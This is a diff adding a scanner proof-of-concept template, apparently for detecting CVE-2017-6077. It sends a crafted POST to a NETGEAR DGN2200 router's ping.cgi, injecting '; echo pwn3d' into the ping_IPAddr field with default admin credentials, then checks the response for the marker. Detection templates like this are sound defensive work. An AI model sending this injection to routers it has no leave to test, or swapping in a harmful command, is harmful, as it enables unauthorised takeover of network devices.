@@ -1,0 +1,34 @@
+[info]
+author = "AVE"
+description = "通过向NETGEAR DGN2200路由器的ping.cgi发送特制POST请求，在ping_IPAddr字段注入shell元字符，检测OS命令执行漏洞。使用echo命令输出特征字符串进行无损验证。"
+id = "POC-AVE-2017-0800"
+name = "NETGEAR DGN2200 ping.cgi OS命令注入 PoC"
+severity = "critical"
+tags = ["ave-2017-0800"]
+vuln_id = [
+    "CVE-2017-6077",
+    "AVE-2017-0800",
+]
+
+[poc]
+logic = "all"
+
+[[poc.requests]]
+method = "POST"
+path = "/{{BaseURL}}/ping.cgi"
+protocol = "http"
+
+[poc.requests.body]
+content = "IPAddr1=12&IPAddr2=12&IPAddr3=12&IPAddr4=12&ping=Ping&ping_IPAddr=12.12.12.12%3B+echo+pwn3d"
+type = "raw"
+
+[poc.requests.headers]
+Authorization = "Basic YWRtaW46cGFzc3dvcmQ="
+Referer = "http://192.168.0.1/DIAG_diag.htm"
+User-Agent = "AVE/1.0"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = ["pwn3d"]
